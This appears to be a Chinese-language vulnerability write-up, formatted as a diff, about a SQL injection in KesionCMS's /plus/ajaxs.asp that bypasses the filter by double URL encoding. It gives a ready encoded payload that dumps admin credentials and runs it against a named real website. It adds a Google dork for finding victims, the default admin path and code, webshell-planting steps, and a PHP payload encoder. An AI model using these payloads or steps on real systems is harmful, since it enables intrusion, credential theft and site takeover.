@@ -1,0 +1,258 @@
+KesionCMS（科汛） “0day”漏洞分析
+
+响版本：kesion v6.0-v7.0以及kesion v7.06 eshop版
+ 
+之所以打个引号，感觉这个不能算是0day，因为只是这个漏洞成因，其实都是同一个函数过滤不严造成的。而且，这个漏洞已经被披露。原漏洞是/user/Reg/regajax.asp下的漏洞。这次出现漏洞的位置是/plus/ajaxs.asp文件，漏洞原理是一样的，都是s函数过滤混乱导致的！
+ 
+看下文件代码：/plus/ajaxs.asp
+ 
+Dim KS:Set KS=New PublicCls
+ 
+Dim Action
+ 
+Action=KS.S(“Action”)
+ 
+Select Case Action
+ 
+Case ”Ctoe” CtoE
+ 
+Case ”GetTags” GetTags
+ 
+Case ”GetRelativeItem” GetRelativeItem
+ 
+Case ”Shop_GetCoupon” Shop_GetCoupon
+ 
+Case ”Shop_ValidateCoupon” Shop_ValidateCoupon
+ 
+Case ”Shop_BrandOption” Shop_BrandOption
+ 
+Case ”Shop_CheckProID” Shop_CheckProID
+ 
+Case ”GetClassOption” GetClassOption
+ 
+Case ”GetFieldOption” GetFieldOption
+ 
+Case ”SpecialSubList” SpecialSubList
+ 
+Case ”GetArea” GetArea
+ 
+Case ”GetFunc” GetFunc
+ 
+Case ”AddFriend” AddFriend
+ 
+Case ”MessageSave” MessageSave
+ 
+Case ”CheckMyFriend” CheckMyFriend
+ 
+Case ”SendMsg” SendMsg
+ 
+Case ”SearchUser” SearchUser
+ 
+Case ”CheckLogin” CheckLogin
+ 
+Case ”relativeDoc” relativeDoc
+ 
+Case ”getModelType” getModelType
+ 
+Case ”getDocImage” getDocImage
+ 
+Case ”checkDocFname” checkDocFname
+ 
+Case ”addCart” addShoppingCart
+ 
+Case ”GetPackagePro” GetPackagePro
+ 
+Case ”GetSupplyContact” GetSupplyContact
+ 
+Case ”HitsGuangGao” HitsGuangGao
+ 
+Case ”GetClubBoardOption” GetClubBoardOption
+ 
+Case ”getclubboard” GetClubboard
+ 
+Case ”getonlinelist” getonlinelist
+ 
+End Select
+ 
+…..snip…
+ 
+‘相关信息
+ 
+Sub GetRelativeItem() //漏洞函数开始
+ 
+Dim Key:Key=UnEscape(KS.S(“Key”))//漏洞位置，只调用ks.s函数，无其它过滤。
+ 
+Dim Rtitle:rtitle=lcase(KS.G(“rtitle”))
+ 
+Dim RKey:Rkey=lcase(KS.G(“Rkey”))
+ 
+Dim ChannelID:ChannelID=KS.ChkClng(KS.S(“Channelid”))
+ 
+Dim ID:ID=KS.ChkClng(KS.G(“ID”))
+ 
+Dim Param,RS,SQL,k,SqlStr
+ 
+If Key<>”” Then
+ 
+If (Rtitle=”true” Or RKey=”true”) Then
+ 
+If Rtitle=”true” Then
+ 
+param=Param & ”title like ’%”& key & ”%’”//类似搜索型注入漏洞。
+ 
+end if
+ 
+If Rkey=”true” Then
+ 
+If Param=”” Then
+ 
+Param=Param & ” keywords like ’%” & key & ”%’”
+ 
+Else
+ 
+Param=Param & ” or keywords like ’%” & key & ”%’”
+ 
+End If
+ 
+End If
+ 
+Else
+ 
+Param=Param & ” keywords like ’%” & key & ”%’”
+ 
+End If
+ 
+End If
+ 
+If Param<>”” Then
+ 
+Param=” where InfoID<>” & id & ” and (“ & param & ”)”
+ 
+else
+ 
+Param=” where InfoID<>” & id
+ 
+end if
+ 
+If ChannelID<>0 Then Param=Param & ” and ChannelID=” & ChannelID
+ 
+Param=Param & ”and verific=1″
+ 
+SqlStr=”Select top 30 ChannelID,InfoID,Title From KS_ItemInfo ”& Param & ”order by id desc”//查询
+ 
+Set RS=Server.CreateObject(“ADODB.RECORDSET”)
+ 
+RS.Open SqlStr,conn,1,1
+ 
+If Not RS.Eof Then
+ 
+SQL=RS.GetRows(-1)
+ 
+End If
+ 
+RS.Close
+ 
+我们来看看Dim Key:Key=UnEscape(KS.S(“Key”))处的函数，调用自定义函数KS.S进行过滤，接着又调用UnEscape函数解码！
+ 然后我们可以去看看函数原型，在/KS_Cls/kesion.commoncls.asp下
+ 
+Function DelSql(Str)
+ 
+Dim SplitSqlStr,SplitSqlArr,I
+ 
+SplitSqlStr=”dbcc|alter|drop|*|and |exec|or |insert|select|delete|update|count |master|truncate|declare|char|mid|chr|set |where|xp_cmdshell”
+ 
+SplitSqlArr = Split(SplitSqlStr,”|”)
+ 
+For I=LBound(SplitSqlArr) To Ubound(SplitSqlArr)
+ 
+If Instr(LCase(Str),SplitSqlArr(I))>0 Then
+ 
+Die ”<script>alert(‘系统警告！\n\n1、您提交的数据有恶意字符“& SplitSqlArr(I) &”;\n2、您的数据已经被记录;\n3、您的IP：“&GetIP&”;\n4、操作日期：“&Now&”;\n Powered By Kesion.Com!’);window.close();</script>”
+ 
+End if
+ 
+Next
+ 
+DelSql = Str
+ 
+End Function
+ 
+‘取得Request.Querystring 或Request.Form 的值
+ 
+Public Function S(Str)
+ 
+S = DelSql(Replace(Replace(Request(Str), ”‘”, ””), ””””, ””)) //止处过滤，如果配合Unescape()函数，刚过滤并末生交，可以采用unicode编码方式，刚不会在浏览器中出现被过滤的字符。例如，单引号可以编码为。%2527，经过解码后还是“‘”号，这样的话，就可以利用类似php的二次编码漏洞的方式绕过过滤了。
+ 
+要成功利用的方法，则要根据
+ 
+Dim KS:Set KS=New PublicCls
+ 
+Dim Action
+ 
+Action=KS.S(“Action”)
+ 
+Select Case Action
+ 
+Case ”Ctoe” CtoE
+ 
+Case ”GetTags” GetTags
+ 
+Case ”GetRelativeItem” GetRelativeItem
+ 
+调用规则进行调用，当调用的action的值为GetRelativeItem时，即可调用GetRelativeItem函数。在这个函数里面，判断key的值是否为空，所以可以在key的后面接任何值，比如conqu3r。因此构造就很简单了，直接根据搜索型的方法注入就行了。
+ 
+如下：将：%’) union select 1,2,username+’|’+ password from KS_Admin转换为如下的即可。
+ 
+/plus/ajaxs.asp?action=GetRelativeItem&key=conqu3r%2525%2527%2529%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2575%2573%2565%2572%256e%2561%256d%2565%252b%2527%257c%2527%252b%2570%2561%2573%2573%2577%256f%2572%2564%2520%2566%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500
+ 
+如果是MSSQL的版本，如果有相应权限，则可以通过备份直接拿shell.
+ 
+此处漏洞可以利用CLng类型转换，报错查路径。
+ 
+方法：
+ 
+/plus/ajaxs.asp?action=GetRelativeItem&key=%25
+ 
+google关键字：intext:Powered By KesionCMS
+ 
+默认后台：/admin/login.asp 默认认证码：8888
+ 
+后台拿webshell的方法：
+ 
+1、通过执行Sql语句，Access导出一句话木马；
+ 
+2、通过插入数据库，备份出一句话。
+ 
+实例：http://www.allvison.com//plus/ajaxs.asp?action=GetRelativeItem&key=conqu3r%2525%2527%2529%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2575%2573%2565%2572%256e%2561%256d%2565%252b%2527%257c%2527%252b%2570%2561%2573%2573%2577%256f%2572%2564%2520%2566%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500
+ 
+附转换代码:
+ 
+[code]
+ 
+<?php
+ error_reporting(E_ERROR);
+ set_time_limit(0);
+ print_r('
+ ================================================================================
+ kesioncms 命令行转换程序
+ ------by conqu3r
+ ================================================================================
+ ');
+ 
+if ($argc<2) {
+ print_r('
+ ================================================================================
+ Usage: php '.$argv[0].' "sql code";
+ 
+Example:
+ php '.$argv[0].' "\'%) union select...";
+ ================================================================================
+ ');
+ die;
+ }
+ $str=$argv[1];
+ for ($i=0; $i<=strlen($str); $i++){
+ $temp .= "%25".base_convert(ord($str[$i]),10,16);
+ }
+ echo $temp."0";
+ ?> 
